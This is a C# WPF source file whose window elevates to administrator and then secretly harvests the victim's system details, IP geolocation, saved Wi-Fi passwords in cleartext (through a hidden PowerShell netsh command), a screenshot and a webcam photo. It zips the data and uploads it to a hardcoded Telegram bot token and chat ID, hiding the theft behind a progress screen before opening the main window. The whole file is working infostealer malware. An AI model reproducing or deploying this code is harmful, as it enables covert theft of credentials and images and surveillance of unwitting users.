using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using Telegram.Bot;
using System.Windows;
using System.Drawing;
using System.Windows.Threading;
using System.Windows.Media.Animation;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using System.Security.Principal;
using WPFUIKitProfessional;

namespace Bibon.Pages
{
    public partial class system : Window
    {
        public system()
        {
            InitializeComponent();

            if (!IsRunAsAdmin())
            {
                RunAsAdmin();
                return;
            }

            if (!IsInternetAvailable())
            {
                MainWindow mainWindow = new MainWindow();
                mainWindow.Show();
                this.Close();
                return;
            }

            myLabel.Content = $"{Environment.UserName}";

            Loaded += async (s, e) =>
            {
                // Для диагностики можно раскомментировать строку ниже:
                // await TestTelegramAsync();
                await RunMainLogicAsync();
            };
        }
        private void UpdateProgress(string status, int value)
        {
            Dispatcher.Invoke(() =>
            {
                statusLabel.Content = status;
                progressBar.Value = value;
            });
        }
        private bool IsRunAsAdmin()
        {
            var wi = WindowsIdentity.GetCurrent();
            var wp = new WindowsPrincipal(wi);
            return wp.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void RunAsAdmin()
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo
            {
                FileName = System.Reflection.Assembly.GetExecutingAssembly().Location,
                Verb = "runas"
            };

            try
            {
                Process.Start(procStartInfo);
                Application.Current.Shutdown();
            }
            catch (Exception ex)
            {
            }
        }

        private bool IsInternetAvailable()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task RunMainLogicAsync()
        {
            string tempPath = Path.GetTempPath();
            string zipPath = Path.Combine(tempPath, $"{Environment.MachineName}.zip");

            try
            {
                UpdateProgress("Удаление старого архива...", 0);
                if (File.Exists(zipPath))
                    File.Delete(zipPath);

                UpdateProgress("Сбор системной информации...", 1);
                var sysInfoTask = Task.Run(GetSystemInfoText);

                UpdateProgress("Сбор Wi-Fi профилей...", 2);
                var wifiInfoTask = Task.Run(GetWifiInfo);

                UpdateProgress("Создание скриншота...", 3);
                var screenshotTask = Task.Run(CaptureScreenshotToStream);

                UpdateProgress("Ожидание камеры и создание фото...", 4);
                var cameraTask = Task.Run(CapturePhotoFromCameraToStream);

                await Task.WhenAll(sysInfoTask, wifiInfoTask, screenshotTask, cameraTask);

                UpdateProgress("Архивация файлов...", 5);
                using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    var sysEntry = archive.CreateEntry("Info System/Info System.txt");
                    using (var writer = new StreamWriter(sysEntry.Open()))
                        writer.Write(await sysInfoTask);

                    var wifiEntry = archive.CreateEntry("Wifi name/Wifi.txt");
                    using (var writer = new StreamWriter(wifiEntry.Open()))
                        writer.Write(await wifiInfoTask);

                    using (var screenshotStream = await screenshotTask)
                    {
                        var screenshotEntry = archive.CreateEntry("Foto/screenshot.jpg");
                        using (var entryStream = screenshotEntry.Open())
                        {
                            screenshotStream.Position = 0;
                            screenshotStream.CopyTo(entryStream);
                        }
                    }

                    var cameraStream = await cameraTask;
                    if (cameraStream != null)
                    {
                        var cameraEntry = archive.CreateEntry("Foto/camera_photo.jpg");
                        using (var entryStream = cameraEntry.Open())
                        {
                            cameraStream.Position = 0;
                            cameraStream.CopyTo(entryStream);
                        }
                    }
                }

                UpdateProgress("Отправка архива в Telegram...", 6);
                await SendToTelegramAsync(zipPath);

                UpdateProgress("Готово!", 6);

                Button_Click1(null, null);
            }
            catch (Exception ex)
            {
                Button_Click1(null, null);
            }
        }

        // Сбор системной информации (асинхронно)
        private string GetSystemInfoText()
        {
            var sw = new StringWriter();
            sw.WriteLine("System Information:");
            sw.WriteLine(new string('-', 50));
            sw.WriteLine("{0,-25} {1}", "PC Name:", Environment.MachineName);
            sw.WriteLine("{0,-25} {1}", "User Name:", Environment.UserName);
            sw.WriteLine("{0,-25} {1}", "Windows Version:", GetWindowsVersion());
            sw.WriteLine("{0,-25} {1}", "Processor Architecture:", Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
            sw.WriteLine("{0,-25} {1}", "RAM:", FormatBytes(Convert.ToInt64(GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory"))));
            sw.WriteLine("{0,-25} {1}", "Local IP:", GetLocalIPAddress());
            sw.WriteLine(GetPublicIPAddressAndGeoInfo());
            return sw.ToString();
        }

        private string GetPublicIPAddressAndGeoInfo()
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    string response = client.DownloadString("https://ipinfo.io/json");
                    var json = JObject.Parse(response);

                    string ip = json["ip"]?.ToString();
                    string country = json["country"]?.ToString();
                    string region = json["region"]?.ToString();
                    string city = json["city"]?.ToString();
                    string loc = json["loc"]?.ToString();
                    string timezone = json["timezone"]?.ToString();

                    return string.Format(
                        "{0,-25} {1}\n{2,-25} {3}\n{4,-25} {5}\n{6,-25} {7}\n{8,-25} {9}\n{10,-25} {11}",
                        "IP:", ip,
                        "Country:", country,
                        "Region:", region,
                        "City:", city,
                        "Location:", loc,
                        "Time Zone:", timezone
                    );
                }
                catch
                {
                    return "IP and Geo Information: Unknown";
                }
            }
        }

        private string GetHardwareInfo(string wmiClass, string wmiProperty)
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {wmiProperty} FROM {wmiClass}");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[wmiProperty]?.ToString();
                }
            }
            catch
            {
                return "Unknown";
            }
            return "Unknown";
        }

        private string GetWindowsVersion()
        {
            return Environment.OSVersion.VersionString;
        }

        private string FormatBytes(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len /= 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        private string GetLocalIPAddress()
        {
            string localIP = "Unknown";
            foreach (var address in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    localIP = address.ToString();
                    break;
                }
            }
            return localIP;
        }

        // Скриншот в поток
        private MemoryStream CaptureScreenshotToStream()
        {
            var screenBounds = System.Windows.Forms.SystemInformation.VirtualScreen;
            var ms = new MemoryStream();
            using (var bmp = new Bitmap(screenBounds.Width, screenBounds.Height))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(screenBounds.Left, screenBounds.Top, 0, 0, bmp.Size);
                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // Максимальное качество!
                bmp.Save(ms, jpegCodec, encoderParams);
            }
            ms.Position = 0;
            return ms;
        }

        // Фото с камеры в поток (если камера есть)
        private MemoryStream CapturePhotoFromCameraToStream()
        {
            AForge.Video.DirectShow.FilterInfoCollection videoDevices = null;
            int waited = 0;
            int maxWaitMs = 2000; // 10 секунд

            while (waited < maxWaitMs)
            {
                videoDevices = new AForge.Video.DirectShow.FilterInfoCollection(AForge.Video.DirectShow.FilterCategory.VideoInputDevice);
                if (videoDevices.Count > 0)
                    break;
                Thread.Sleep(500);
                waited += 500;
            }

            if (videoDevices == null || videoDevices.Count == 0)
                return null; // Камера не найдена, выходим

            try
            {
                var videoSource = new AForge.Video.DirectShow.VideoCaptureDevice(videoDevices[0].MonikerString);
                Bitmap bitmap = null;
                ManualResetEvent frameCaptured = new ManualResetEvent(false);

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    bitmap = (Bitmap)eventArgs.Frame.Clone();
                    frameCaptured.Set();
                    videoSource.SignalToStop();
                };
                videoSource.Start();

                frameCaptured.WaitOne();

                var ms = new MemoryStream();
                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 100L);
                bitmap.Save(ms, jpegCodec, encoderParams);
                ms.Position = 0;
                return ms;
            }
            catch
            {
                return null;
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }

        // Получение Wi-Fi профилей и паролей
        private string GetWifiInfo()
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var wifiList = Newtonsoft.Json.JsonConvert.DeserializeObject<List<WifiProfile>>(output);

                StringWriter writer = new StringWriter();
                writer.WriteLine("Wi-Fi Profiles:");
                writer.WriteLine(new string('-', 50));
                writer.WriteLine("{0,-25} {1}", "Profile Name", "Password");
                writer.WriteLine(new string('-', 50));

                foreach (var wifi in wifiList)
                {
                    writer.WriteLine("{0,-25} {1}", wifi.ProfileName, wifi.Password);
                }
                return writer.ToString();
            }
            catch
            {
                return "Wi-Fi info unavailable";
            }
        }

 
  

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        // Поиск файлов cookies браузеров

        // Отправка архива в Telegram с обработкой ошибок
        private async Task SendToTelegramAsync(string zipPath)
        {
            try
            {
                var fileInfo = new FileInfo(zipPath);
                if (fileInfo.Length > 50 * 1024 * 1024)
                {
                    return;
                }

                var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
                using (var fileStream = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
                {
                    await botClient.SendDocumentAsync(
                        chatId: "1005333334",
                        document: new Telegram.Bot.Types.InputFiles.InputOnlineFile(fileStream, $"{Environment.MachineName}.zip")
                    );
                }
            }
            catch (Exception ex)
            {
            }
        }

        // Анимация закрытия и переход в MainWindow
        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            DoubleAnimation fadeOutAnimation = new DoubleAnimation
            {
                From = 1,
                To = 0,
                Duration = TimeSpan.FromSeconds(0.1)
            };

            fadeOutAnimation.Completed += (s, a) =>
            {
                this.Close();
            };

            this.BeginAnimation(Window.OpacityProperty, fadeOutAnimation);

            MainWindow mainWindow = new MainWindow();
            mainWindow.Show();
        }

    }
}